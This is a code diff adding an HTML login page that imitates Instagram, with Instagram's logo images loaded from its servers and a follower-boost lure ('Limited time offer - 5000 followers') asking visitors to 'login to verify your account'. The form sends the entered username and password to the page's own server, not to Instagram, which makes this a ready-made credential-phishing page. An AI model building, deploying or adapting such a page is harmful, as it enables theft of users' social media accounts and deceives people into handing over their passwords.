@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
+    <style>
+        body {
+            background: #000;
+            font-family: 'Roboto', Arial, sans-serif;
+            color: #fafafa;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+        .insta-container {
+            width: 420px;
+            margin: 40px auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .insta-card {
+            background: #000;
+            border: 1px solid #262626;
+            padding: 40px 32px 20px;
+            border-radius: 1px;
+            max-width: 350px;
+            width: 100%;
+        }
+        .insta-logo {
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+        .insta-app-icon {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 12px;
+        }
+        .insta-wordmark {
+            width: 175px;
+            filter: brightness(0) invert(1);
+        }
+        .insta-form {
+            width: 100%;
+            padding: 0;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .insta-input,
+        .insta-btn {
+            width: 268px;
+            box-sizing: border-box;
+        }
+        .insta-input {
+            width: 268px;
+            margin-bottom: 6px;
+            padding: 9px 8px;
+            font-size: 12px;
+            border: 1px solid #262626;
+            border-radius: 4px;
+            background: #262626;
+            color: #fafafa;
+            height: 36px;
+            box-sizing: border-box;
+        }
+        .insta-input:focus {
+            outline: none;
+            border-color: #666;
+        }
+        .insta-btn {
+            width: 240px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            padding: 7px 16px;
+            margin: 8px auto;
+            cursor: pointer;
+            font-size: 14px;
+            height: 32px;
+            transition: background 0.2s;
+            display: block;
+        }
+        .insta-btn:hover {
+            background: #1877f2;
+        }
+        .insta-forgot {
+            color: #385898;
+            font-size: 12px;
+            line-height: 16px;
+            margin-top: 12px;
+            text-align: center;
+            width: 100%;
+        }
+        .insta-signup-card {
+            background: #1a1a1a;
+            border: 1px solid #262626;
+            padding: 20px 0;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 15px;
+            border-radius: 8px;
+        }
+        .insta-signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        .insta-signup-card a:hover {
+            text-decoration: underline;
+        }
+        .promo-heading {
+            text-align: center;
+            margin-bottom: 20px;
+            animation: glow 3s ease-in-out infinite;
+        }
+        .main-offer {
+            color: #ffd700;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 6px;
+            line-height: 1.3;
+            text-shadow: 0 0 8px rgba(255, 215, 0, 0.2);
+        }
+        .sub-offer {
+            color: #ff4747;
+            font-size: 12px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+            opacity: 0.9;
+        }
+        .login-text {
+            color: #8e8e8e;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        @keyframes glow {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        @media (max-width: 500px) {
+            .insta-container {
+                width: 100vw;
+                min-height: 100vh;
+                margin: 0;
+                padding: 0 0 24px 0;
+                justify-content: flex-start;
+            }
+            .insta-card, .insta-signup-card {
+                width: 96vw;
+                min-width: 0;
+                border-radius: 0;
+                border-left: none;
+                border-right: none;
+                padding: 32px 4vw 20px 4vw;
+                box-sizing: border-box;
+            }
+            .insta-logo {
+                margin-bottom: 24px;
+            }
+            .insta-app-icon {
+                width: 56px;
+                height: 56px;
+            }
+            .insta-wordmark {
+                width: 140px;
+            }
+            .insta-input,
+            .insta-btn {
+                width: 100% !important;
+                font-size: 15px;
+                padding: 11px 6px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="insta-container">
+        <div class="insta-card">
+            <div class="insta-logo">
+                <img class="insta-app-icon" src="https://instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Instagram App Icon">
+                <img class="insta-wordmark" src="https://instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            <div class="promo-heading">
+                <div class="main-offer">Exclusive: Boost your Instagram presence</div>
+                <div class="sub-offer">Limited time offer - 5000 followers</div>
+            </div>
+            <div class="login-text">Just login to verify your account</div>
+            <form method="POST" action="/" class="insta-form">
+                <input class="insta-input" type="text" name="username" placeholder="Phone number, username, or email" required>
+                <input class="insta-input" type="password" name="password" placeholder="Password" required>
+                <button class="insta-btn" type="submit">Log In</button>
+            </form>
+            <a class="insta-forgot" href="#">Forgot password?</a>
+        </div>
+        <div class="insta-signup-card">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+</body>
+</html>
